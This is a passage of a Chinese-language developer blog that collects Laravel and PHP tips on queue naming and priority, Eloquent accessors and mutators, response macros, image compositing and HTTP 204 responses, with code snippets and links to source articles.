的还有元素，否则它们俩就相等了。然后比较key和key+1的值。</span></span><br><span class="line">极限是所有的人都和第三名相同，自行判断是否需要所有人都胜出，来限制 $resultLength 的长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>($resultLength&lt;$length &amp;&amp;$results[$resultLength<span class="number">-1</span>][<span class="string">'score'</span>]==$arr[$resultLength][<span class="string">'score'</span>])&#123;</span><br><span class="line">            array_push($results,$arr[$resultLength]);</span><br><span class="line">            $resultLength = count($results);</span><br><span class="line">        &#125;</span><br><span class="line">最后如果要判断某一用户是否胜出</span><br><span class="line"></span><br><span class="line">$ifWinner = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(in_array($id,array_column($results,<span class="string">'id'</span>)))&#123;</span><br><span class="line">       $ifWinner = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="多个-Laravel-应用-queue-队列执行时会互串"><a href="#多个-Laravel-应用-queue-队列执行时会互串" class="headerlink" title="多个 Laravel 应用 queue 队列执行时会互串"></a>多个 Laravel 应用 queue 队列执行时会互串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">app/Libriries/helper.php ，可以写在你任何想放的地方</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 多个 laravel 项目，如果 --queue 相同会互串</span></span><br><span class="line"><span class="comment"> * 这里统一加个当前项目名的前缀来区分</span></span><br><span class="line"><span class="comment"> * @param $name</span></span><br><span class="line"><span class="comment"> * @return string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">queue_name</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">    $name_trans = [];</span><br><span class="line">    foreach(explode(<span class="string">','</span>,$name) <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        $name_trans[] = str_slug(config(<span class="string">'app.name'</span>) . <span class="string">' '</span> . $v, <span class="string">'_'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode(<span class="string">','</span>,$name_trans);</span><br><span class="line">&#125;</span><br><span class="line">修改每个 Job 的 $queue 添加 queue_name ()</span><br><span class="line"></span><br><span class="line">namespace App\Jobs;</span><br><span class="line"><span class="comment">// 省略...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApiBehavior</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 添加这一行</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;queue = queue_name(<span class="string">'你的队列名'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 分发队列时，照常分发即可</span></span><br><span class="line">ApiBehavior::dispatch()</span><br><span class="line"><span class="comment">// 或者这种分发时指定，可以省略第二步。</span></span><br><span class="line">ApiBehavior::dispatch()-&gt;onQueue(quque_name(<span class="string">'你的队列名'</span>))</span><br><span class="line">新建监听队列命令，包装一层 quque:work，以使用自定义队列名</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Console\Commands;</span><br><span class="line"></span><br><span class="line">use Illuminate\Console\Command;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueWorkListen</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $signature = <span class="string">'queue:work-listen</span></span><br><span class="line"><span class="string">                            &#123;connection? : The name of the queue connection to work&#125;</span></span><br><span class="line"><span class="string">                            &#123;--queue= : The names of the queues to work&#125;</span></span><br><span class="line"><span class="string">                            &#123;--daemon : Run the worker in daemon mode (Deprecated)&#125;</span></span><br><span class="line"><span class="string">                            &#123;--once : Only process the next job on the queue&#125;</span></span><br><span class="line"><span class="string">                            &#123;--delay=0 : The number of seconds to delay failed jobs&#125;</span></span><br><span class="line"><span class="string">                            &#123;--force : Force the worker to run even in maintenance mode&#125;</span></span><br><span class="line"><span class="string">                            &#123;--memory=128 : The memory limit in megabytes&#125;</span></span><br><span class="line"><span class="string">                            &#123;--sleep=3 : Number of seconds to sleep when no job is available&#125;</span></span><br><span class="line"><span class="string">                            &#123;--timeout=60 : The number of seconds a child process can run&#125;</span></span><br><span class="line"><span class="string">                            &#123;--tries=0 : Number of times to attempt a job before logging it failed&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $description = <span class="string">'Start processing jobs on the queue as a daemon'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new command instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;call(<span class="string">'queue:work'</span>,[</span><br><span class="line">            <span class="string">'connection'</span>=&gt; $<span class="keyword">this</span>-&gt;argument(<span class="string">'connection'</span>),</span><br><span class="line">            <span class="string">'--queue'</span>   =&gt; queue_name($<span class="keyword">this</span>-&gt;option(<span class="string">'queue'</span>) ?: <span class="string">'default'</span>),</span><br><span class="line">            <span class="string">'--daemon'</span>  =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'daemon'</span>),</span><br><span class="line">            <span class="string">'--once'</span>    =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'once'</span>),</span><br><span class="line">            <span class="string">'--delay'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'delay'</span>),</span><br><span class="line">            <span class="string">'--force'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'force'</span>),</span><br><span class="line">            <span class="string">'--memory'</span>  =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'memory'</span>),</span><br><span class="line">            <span class="string">'--sleep'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'sleep'</span>),</span><br><span class="line">            <span class="string">'--timeout'</span> =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'timeout'</span>),</span><br><span class="line">            <span class="string">'--tries'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'tries'</span>),</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5</span>、使用自定义命令监听队列，其他参数与 queue:work 一样使用https:<span class="comment">//learnku.com/articles/19460</span></span><br><span class="line"></span><br><span class="line">php /<span class="keyword">var</span>/www/ebank/artisan queue:work-listen --queue=email --sleep=<span class="number">3</span></span><br><span class="line"><span class="comment">// or 多个</span></span><br><span class="line">php /<span class="keyword">var</span>/www/ebank/artisan queue:work-listen --queue=email,test,test2,test3 --sleep=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">redis配置不同库就可以</span><br></pre></td></tr></table></figure>
<h3 id="修改器"><a href="#修改器" class="headerlink" title="修改器"></a>修改器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Models;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line">use Carbon\Carbon;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $table = <span class="string">'baby'</span>;</span><br><span class="line">    protected $appends = [<span class="string">'age'</span>];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getAgeAttribute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $date = <span class="keyword">new</span> Carbon($<span class="keyword">this</span>-&gt;birthday);</span><br><span class="line">        <span class="keyword">return</span> Carbon::now()-&gt;diffInYears($date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这个代码比较简单，就是通过已有属性 birthday，计算 Baby 几岁了，得到 age 属性。</span><br><span class="line"></span><br><span class="line">前端就可以直接拿到结果：https:<span class="comment">//learnku.com/articles/21982#topnav</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $baby-&gt;age;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更改为日期类型的属性</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $dates = [</span><br><span class="line">        <span class="string">'created_at'</span>, </span><br><span class="line">        <span class="string">'updated_at'</span>, </span><br><span class="line">        <span class="string">'expires_at'</span>, </span><br><span class="line">        <span class="string">'gets_mad_at'</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 我们检索时始终将名字大写</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getFirstNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ucfirst($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 我们检索时始终将姓氏大写</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getLastNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ucfirst($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将名称保存到数据库时，始终将名字大写</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">setFirstNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;attributes[<span class="string">'first_name'</span>] = ucfirst($value);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将名称保存到数据库时，始终将姓氏大写</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">setLastNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;attributes[<span class="string">'last_name'</span>] = ucfirst($value);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 我们将密码保存至数据库时，总是哈希后保存。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            public <span class="function"><span class="keyword">function</span> <span class="title">setPasswordAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;attributes[<span class="string">'password'</span>] = Hash::make($value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 总是 json_decode settings字段，所以它们是可用的</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                public <span class="function"><span class="keyword">function</span> <span class="title">getSettingsAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> json_decode($value);</span><br><span class="line">            </span><br><span class="line">                    <span class="comment">// 你可以确保同时返回一个数组</span></span><br><span class="line">                    <span class="comment">// return json_decode($value, true);</span></span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                * 保存到数据库时，总是对 settings 字段进行 json_encode</span></span><br><span class="line"><span class="comment">                 * Always json_encode the settings when saving to the database</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                public <span class="function"><span class="keyword">function</span> <span class="title">setSettingsAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                    $<span class="keyword">this</span>-&gt;attributes[<span class="string">'settings'</span>] = json_encode($value);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取 awesomedudette 用户  https://learnku.com/laravel/t/27551</span></span><br><span class="line">$user = App\User::where(<span class="string">'username'</span>, <span class="string">'awesomedudette'</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找此用户的过期时间前一小时</span></span><br><span class="line">$explodeWarning = $user-&gt;explodes_at-&gt;subHour();</span><br><span class="line">$user = App\User::create([</span><br><span class="line">    <span class="string">'first_name'</span>  =&gt; <span class="string">'chris'</span>,</span><br><span class="line">    <span class="string">'last_name'</span>   =&gt; <span class="string">'sevilleja'</span>,</span><br><span class="line">    <span class="string">'email'</span>       =&gt; <span class="string">'chris&amp;64;scotch.io'</span>,</span><br><span class="line">    <span class="string">'password'</span>    =&gt; <span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'expires_at'</span>  =&gt; Carbon::now()-&gt;addMonth(),</span><br><span class="line">    <span class="string">'explodes_at'</span> =&gt; Carbon::now()-&gt;addDay(),</span><br><span class="line">    <span class="string">'gets_mad_at'</span> =&gt; Carbon::yesterday()</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<h3 id="响应宏原理"><a href="#响应宏原理" class="headerlink" title="响应宏原理"></a>响应宏原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Response::macro(<span class="string">'success'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$data = [], $message = <span class="string">'success'</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JsonResponse([</span><br><span class="line">        <span class="string">'code'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'data'</span> =&gt; $data,</span><br><span class="line">        <span class="string">'message'</span> =&gt; $message</span><br><span class="line">    ], <span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">接下来， 你可以再任何地方使用它response()。https:<span class="comment">//godruoyi.com/posts/laravel-response-macro-principle</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//UserController.php</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params">UserRepository $userRepository</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> response()-&gt;success($userRepository-&gt;all(), <span class="string">'success'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注意，你只能通过response()这个全局方法或是app(<span class="string">'Illuminate\Routing\ResponseFactory'</span>)来使用它</span><br><span class="line"></span><br><span class="line">response()-&gt;success();<span class="comment">//OK</span></span><br><span class="line">app(<span class="string">'Illuminate\Routing\ResponseFactory'</span>)-&gt;success();<span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Response Facade</span></span><br><span class="line">Response::success();<span class="comment">//ok</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> \Illuminate\Http\Response)-&gt;success();<span class="comment">//Error</span></span><br><span class="line">每一次请求结束，PHP 的变量都会 unset，Laravel 的 singleton 只是在某一次请求过程中的singleton；你在 Laravel 中的静态变量也不能在多个请求之间共享，因为每一次请求结束都会 unset。理解这些概念，是写高质量代码的第一步，也是最关键的一步。因此记住，PHP是一种脚本语言，所有的变量只会在这一次请求中生效，下次请求之时已被重置，而不像Java静态变量拥有全局作用。</span><br></pre></td></tr></table></figure>
<h3 id="队列优先级的一个坑"><a href="#队列优先级的一个坑" class="headerlink" title="队列优先级的一个坑"></a>队列优先级的一个坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">php artisan queue:work --queue=high,low</span><br><span class="line">这样，当我们的任务需要优先发送时，就可以通过指定队列名high来优先发送。</span><br><span class="line"></span><br><span class="line">dispatch((<span class="keyword">new</span> Job)-&gt;onQueue(<span class="string">'high'</span>));</span><br><span class="line">但是当你后续任务没有指定队列名（high、low）时，你的队列任务永远也不会执行。（比如我们在发送消息通知时）</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Notifications;</span><br><span class="line"></span><br><span class="line">use Illuminate\Bus\Queueable;</span><br><span class="line">use Illuminate\Notifications\Notification;</span><br><span class="line">use Illuminate\Contracts\Queue\ShouldQueue;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YourNotification</span> <span class="keyword">extends</span> <span class="title">Notification</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Queueable;</span><br><span class="line">&#125;</span><br><span class="line">你发现即使你按照文档说的，implements ShouldQueue并且use Queueable，该通知还是无法加入队列。</span><br><span class="line"></span><br><span class="line">那是因为config\queuq.php配置中，指定了默认的队列名为<span class="keyword">default</span>，所以所有的队列任务，如果没指定队列名时，默认是<span class="keyword">default</span>。</span><br><span class="line"></span><br><span class="line">但是我们在启动队列进程时，只指定了high和low。当然不会生效。https:<span class="comment">//godruoyi.com/posts/a-pit-in-the-laravel-queue-priority</span></span><br><span class="line"></span><br><span class="line">解决办法： <span class="number">1</span>、修改config\queuq.php默认队列名为low或high <span class="number">2</span>、启动队列进程时添加<span class="keyword">default</span>（--queue=high,<span class="keyword">default</span>,low）</span><br></pre></td></tr></table></figure>
<h3 id="合成图片"><a href="#合成图片" class="headerlink" title="合成图片"></a>合成图片</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use Intervention\Image\ImageManager;</span><br><span class="line"></span><br><span class="line">$manager = <span class="keyword">new</span> ImageManager(array(<span class="string">'driver'</span> =&gt; <span class="string">'imagick'</span>));</span><br><span class="line">如果是在 Laravel 中，可直接通过 app(<span class="string">'image'</span>) 或使用 Intervention\Image\Facades\Image 门面类。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use Intervention\Image\Facades\Image;</span><br><span class="line"></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">$manager = app(<span class="string">'image'</span>);</span><br><span class="line">合成</span><br><span class="line"></span><br><span class="line"><span class="comment">// $image = $manager-&gt;make($bg);</span></span><br><span class="line"><span class="comment">// $image = Image::make($bg);</span></span><br><span class="line"></span><br><span class="line">$image = app(<span class="string">'image'</span>)-&gt;make($bg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 二维码图片https://godruoyi.com/posts/intervention-image-was-used-to-synthesize-images</span></span><br><span class="line">$qrcodeImage = app(<span class="string">'image'</span>)-&gt;make($qrcodeurl)-&gt;resize(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"><span class="comment">// 重置 头像 大小</span></span><br><span class="line">$avatarImage  = app(<span class="string">'image'</span>)-&gt;make($httpClient-&gt;request(<span class="string">'GET'</span>, $avatarurl)-&gt;getBody())-&gt;resize(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">$image-&gt;text(<span class="string">'Nickname'</span>, <span class="number">376</span>, <span class="number">320</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$font</span>) </span>&#123;</span><br><span class="line">    $font-&gt;file(public_path(<span class="string">'fonts/SimHei.ttf'</span>));</span><br><span class="line">    $font-&gt;size(<span class="number">40</span>);</span><br><span class="line">    $font-&gt;color(<span class="string">'#000000'</span>);</span><br><span class="line">    $font-&gt;align(<span class="string">'center'</span>);</span><br><span class="line">    $font-&gt;valign(<span class="string">'top'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$image-&gt;insert($qrcodeImage, <span class="string">'bottom'</span>, <span class="number">0</span>, <span class="number">360</span>);</span><br><span class="line">$image-&gt;insert($avatarImage, <span class="string">'top'</span>, <span class="number">0</span>, <span class="number">105</span>);</span><br></pre></td></tr></table></figure>
<h3 id="http-code-204"><a href="#http-code-204" class="headerlink" title="http code 204"></a>http code 204</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">204</span> 为成功状态响应码，表示目前请求成功，但客户端不需要更新其现有页面。<span class="number">204</span> 响应默认是可以被缓存的。在响应中需要包含头信息 ETag。</span><br><span class="line"></span><br><span class="line">使用惯例是，在 PUT 请求中进行资源更新，但是不需要改变当前展示给用户的页面，那么返回 <span class="number">204</span> No Content。如果新创建了资源，那么返回 <span class="number">201</span> Created 。如果页面需要更新以反映更新后的资源，那么需要返回 <span class="number">200</span> 。</span><br><span class="line"></span><br><span class="line">所以大家在做 RestFul API 接口是，store、update 什么的，别全 <span class="number">200</span> <span class="number">200</span> 的返回了，不正规。https:<span class="comment">//learnku.com/articles/28056</span></span><br></pre></td></tr></table></figure>
